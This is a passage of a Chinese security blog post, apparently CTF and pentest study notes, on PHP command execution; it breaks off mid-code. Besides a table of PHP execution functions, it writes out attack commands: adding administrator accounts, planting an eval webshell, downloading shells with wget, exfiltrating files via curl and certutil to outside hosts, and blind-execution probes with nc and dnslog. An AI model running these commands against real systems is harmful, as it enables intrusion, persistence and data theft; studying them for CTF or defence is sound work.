@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>代码执行|命令执行 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='OWASP, 命令执行' />
+  <meta itemprop="name" content="代码执行|命令执行">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="783">
+  <meta itemprop="keywords" content="OWASP,命令执行"><meta property="og:url" content="https://dongyu29.github.io/posts/owasp/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/109/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="代码执行|命令执行">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="OWASP">
+    <meta property="article:tag" content="命令执行">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="代码执行|命令执行">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/owasp/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/109/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/62/" /><link rel="next" href="https://dongyu29.github.io/posts/owasp/xxe/128/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "代码执行|命令执行",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/owasp\/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\/109\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, 命令执行","wordcount":  783 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/owasp\/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\/109\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">代码执行|命令执行</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>代码执行|命令执行</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="783 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>4 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="判断目标操作系统" class="heading-element"><span>0.0.0.1  判断目标操作系统</span>
+  <a href="#%e5%88%a4%e6%96%ad%e7%9b%ae%e6%a0%87%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>对于有回显/出网的情况就很好判断了。</p>
+<p>这里介绍无回显不出网情况下的判断方法：</p>
+<p>Ping命令在Linux和Win中的参数不同，“要发送的回显请求数”  在Linux中为<code>-c</code>参数，Win中为<code>-n</code>参数</p>
+<p>Windows下的Ping命令每间隔一秒会发送一个ICMP ECHO_REQUEST 包，因此可以利用 Ping 命令来近似地模拟等待指定秒数的效果</p>
+<p>应该目标通过 <code>ping -n</code>产生了相应的延时，则说明是Windows系统，反则Linux系统</p>
+<h5 id="代码命令执行函数" class="heading-element"><span>0.0.0.2  代码&amp;命令执行函数</span>
+  <a href="#%e4%bb%a3%e7%a0%81%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e5%87%bd%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><blockquote>
+<p>可以代码&amp;命令执行的函数有很多，有可以回显的，也有不回显的。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">函数</th>
+<th style="text-align:center">说明</th>
+<th style="text-align:center">例子</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">string system($command[,int $return_var])</td>
+<td style="text-align:center">command是要执行的命令，如果提供return参数，则外部命令执行后的返回状态将会被设置到此变量中，显示输出。</td>
+<td style="text-align:center"><code>system('whoami')</code></td>
+</tr>
+<tr>
+<td style="text-align:center">void passthru($command[,int $return_var])</td>
+<td style="text-align:center">执行外部程序并且显示原始输出。</td>
+<td style="text-align:center"><code>passthru('whoami')</code></td>
+</tr>
+<tr>
+<td style="text-align:center">string exec(string $command[,array $output[,int $return_var]])</td>
+<td style="text-align:center">执行指定的命令，并返回结果的最后一行内容，==不显示输出==</td>
+<td style="text-align:center"><code>echo exec('whoami')</code></td>
+</tr>
+<tr>
+<td style="text-align:center">string shell_exec(string $cmd)</td>
+<td style="text-align:center">通过shell环境执行命令，并且将完整的输出以字符串的方式返回。</td>
+<td style="text-align:center"><code>echo shell_exec('whoami')</code></td>
+</tr>
+<tr>
+<td style="text-align:center">void pcntl_exec(string  $path[,array $args[,array $envs]])</td>
+<td style="text-align:center">path是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本。args是一个要传递给程序的参数的字符串数组。该模块不能在非unix平台（win）上运行。</td>
+<td style="text-align:center"><code>pcntl_exec(&quot;/bin/cat&quot;,array(&quot;etc/passwd&quot;));</code></td>
+</tr>
+<tr>
+<td style="text-align:center">resource popen(string $command,string $mode)</td>
+<td style="text-align:center">打开一个指向进程的管道，该进程由派生给定的command命令执行而产生。后面的mode，当为r，返回的文件指针等于命令的STDOUT，当为w，返回的文件指针等于命令的STDIN。</td>
+<td style="text-align:center"><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303271442975.png" alt="image-20230327144229397" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303271442975.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303271442975.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303271442975.png?size=large 2x" data-title="image-20230327144229397" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></td>
+</tr>
+<tr>
+<td style="text-align:center">反引号</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">echo `whoami`;</td>
+</tr>
+<tr>
+<td style="text-align:center">string create_function()</td>
+<td style="text-align:center">php中使用create_function()创建一个匿名函数，如果对参数未进行严格的过滤审查，攻击者可以通过提交特殊字符串给create_function()从而导致任意代码执行。</td>
+<td style="text-align:center"><code>create_function('$test','};phpinfo();/*');</code></td>
+</tr>
+<tr>
+<td style="text-align:center">array array_map(callable $callback,array $array1[,array $&hellip;])</td>
+<td style="text-align:center">为数组的每个元素应用回调函数。其返回值为数组，是为array1每个元素应用callback函数之后的数组。callback 函数形参的数量和传给array_map()数组数量，两者必须一样。</td>
+<td style="text-align:center"><code>array_map('system',array('whoami'));</code></td>
+</tr>
+<tr>
+<td style="text-align:center">array array_filter(array $array[,callable $callback[,int $flag=0]])</td>
+<td style="text-align:center">依次将array数组中的每个值传递到callback 函数。如果callback 函数返回true，则array数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</td>
+<td style="text-align:center"><code>array_filter(array('whoami'),'system');</code></td>
+</tr>
+<tr>
+<td style="text-align:center">bool usort(array  $array,callable $value_compare_func)</td>
+<td style="text-align:center">通过用户自定义的比较函数对数组进行排序。</td>
+<td style="text-align:center"><code>$a=array('whoami','t);usort($a,&quot;system&quot;);</code></td>
+</tr>
+<tr>
+<td style="text-align:center">bool uasort(array $array,callable $value_compare_func)</td>
+<td style="text-align:center">使用用户自定义的比较函数对数组中的值进行排序并保持索引关联。</td>
+<td style="text-align:center"><code>$a=array('whoami','t');uasort($a,&quot;system&quot;);</code></td>
+</tr>
+</tbody>
+</table>
+<h5 id="有回显命令执行" class="heading-element"><span>0.0.0.3  有回显命令执行</span>
+  <a href="#%e6%9c%89%e5%9b%9e%e6%98%be%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="出网" class="heading-element"><span>0.0.0.3.1  出网</span>
+  <a href="#%e5%87%ba%e7%bd%91" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>如果目标开放远程桌面端口的话，并且权限足够可以直接执行命令添加账号</p>
+<pre tabindex="0"><code>net user test test@123qaz /add
+net localgroup administrators test /add
+或者启用guest账号：
+net user guest /active:yes
+net user guest guest@123qaz
+net localgroup administrators guest /add</code></pre><h6 id="不出网" class="heading-element"><span>0.0.0.3.2  不出网</span>
+  <a href="#%e4%b8%8d%e5%87%ba%e7%bd%91" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>针对这种场景，解决方法就比较灵活了。因为不通外网，所以主思路还是想办法写入webshell。</p>
+<p>1.确认Web应用物理路径</p>
+<pre tabindex="0"><code>dir /s/a-d/b /WEB-INF/web.xml
+或者
+for /r c: %i in (checkCode.js*) do @echo %i</code></pre><p>2.写入webshell，需要考虑webshell特殊符号问题，可以先做base64编码写入</p>
+<p>3.使用certutil解码</p>
+<pre tabindex="0"><code>certutil -decode D:\OA\apache-tomcat-7.0.91\webapps\ROOT\shell.txt D:\OA\apache-tomcat-7.0.91\webapps\ROOT\shell.jsp</code></pre><p>linux</p>
+<pre tabindex="0"><code>find . -type f -name yokan_test.js|while read f;do echo $f &gt;$(dirname $f)/test.txt;done
+echo webshell的base64编码内容 |base64 -d &gt; Web应用目录/test.jsp  </code></pre><h5 id="无回显命令执行" class="heading-element"><span>0.0.0.4  无回显命令执行</span>
+  <a href="#%e6%97%a0%e5%9b%9e%e6%98%be%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="判断" class="heading-element"><span>0.0.0.4.1  判断</span>
+  <a href="#%e5%88%a4%e6%96%ad" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">highlight_file</span>(<span style="color:#58a1dd">__FILE__</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span>(<span style="color:#58a1dd">issert</span>(<span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;cmd&#39;</span>])){
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">shell_exec</span>(<span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;cmd&#39;</span>]);
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><ol>
+<li>
+<p>延时</p>
+<p>?cmd=sleep 3</p>
+<p>通过是否延时来判断命令是否已经执行，有延时则表示命令有执行</p>
+</li>
+<li>
+<p>HTTP请求</p>
+<p>在公网服务器监听端口</p>
+<p>nc -lvp 4444</p>
+<p>向目标服务器发起http请求，执行curl命令</p>
+<p>?cmd=curl ip:4444</p>
+</li>
+<li>
+<p>DNS请求</p>
+<p>dnslog</p>
+<p>?cmd=ping 9y8y3k.dnslog.cn</p>
+</li>
+</ol>
+<h6 id="利用" class="heading-element"><span>0.0.0.4.2  利用</span>
+  <a href="#%e5%88%a9%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 直接拿flag</p>
+<ol>
+<li>
+<p>使用<code>&gt;</code>或<code>&gt;&gt;</code></p>
+<blockquote>
+<p>?cmd=cat flag.php&gt;flag.txt</p>
+</blockquote>
+</li>
+<li>
+<p><code>mv</code> 或 <code>cp</code></p>
+<blockquote>
+<p>?cmd=mv flag.php flag.txt</p>
+<p>?cmd=cp flag.php flag.txt?cmd=mv flag.php flag.txt</p>
+<p>?cmd=cp flag.php flag.txt</p>
+</blockquote>
+</li>
+<li>
+<p>打包压缩</p>
+<blockquote>
+<p><code>tar</code></p>
+<p>tar cvf flag.tar flag.php</p>
+<p>tar zcvf flag.tar.gz flag.php</p>
+<p><code>zip</code></p>
+<p>zip flag.zip flag.php</p>
+</blockquote>
+</li>
+<li>
+<p><code>cut and sleep</code></p>
+<blockquote>
+<p>sed指定读取文件的第几行</p>
+<p>cat flag.php|sed -n &lsquo;2p&rsquo;</p>
+<p>提取每一行的第三个字节</p>
+<p>cut -b 3 flag文件</p>
+<p>最后</p>
+<p>cat flag.php|sed -n &lsquo;2p&rsquo;|cut -b 1</p>
+</blockquote>
+</li>
+<li>
+<p><code>curl</code>外带数据</p>
+<blockquote>
+<p>用&lt;替换读取文件中的空格，且对输出结果base64编码</p>
+<p>curl `cat&lt;flag.php|base64`</p>
+<p>再拼接上要请求的vps</p>
+<p>curl `cat&lt;flag.php|base64`.xxxx.com</p>
+</blockquote>
+</li>
+</ol>
+<p>####### 拿shell</p>
+<p>######## 判断web路径</p>
+<p><strong>第一，利用特殊的文件定位Web路径并将路径写入特殊文件同目录下的txt文件</strong></p>
+<p>这里以 yokan_test.js 为例：</p>
+<pre tabindex="0"><code>for /f %i in (&#39;dir /x /s /b yokan_test.js&#39;) do (echo %i&gt;%i.path.txt)</code></pre><p><strong>第二，利用特殊的文件定位Web路径并将结果发送至DNSLog</strong></p>
+<pre tabindex="0"><code>for /r c: %i in (yokan_test.js*) do certutil -urlcache -split -f http://x.x.x.x/%i</code></pre><p>当然，可以发送路径，也可以直接执行命令</p>
+<pre tabindex="0"><code>for /f %i in (&#39;dir /x /s /b yokan_test.js&#39;) do (ipconfig &gt;%i.ipconfig.txt)</code></pre><p>######## 正向shell</p>
+<p>######### 无字符数量限制</p>
+<ul>
+<li>
+<p>直接写入</p>
+<pre tabindex="0"><code>?cmd=echo&#34;&lt;?php @eval(\$_POST[1]);?&gt;&#34; &gt; webshell.php</code></pre></li>
+<li>
+<p>外部下载</p>
+<blockquote>
+<p>wget 网址 -O webshell.php   #使用wget下载shell,使用参数-O来指定一个文件名</p>
+</blockquote>
+</li>
+</ul>
+<p>wget http://192.168.111.128/1.php -O webshell.php</p>
+<p>######### 有限字符限制</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">highlight_file</span>(<span style="color:#58a1dd">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span>(<span style="color:#58a1dd">strlen</span>(<span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">1</span>])<span style="color:#ff636f">&lt;</span><span style="color:#a6be9d">15</span>){
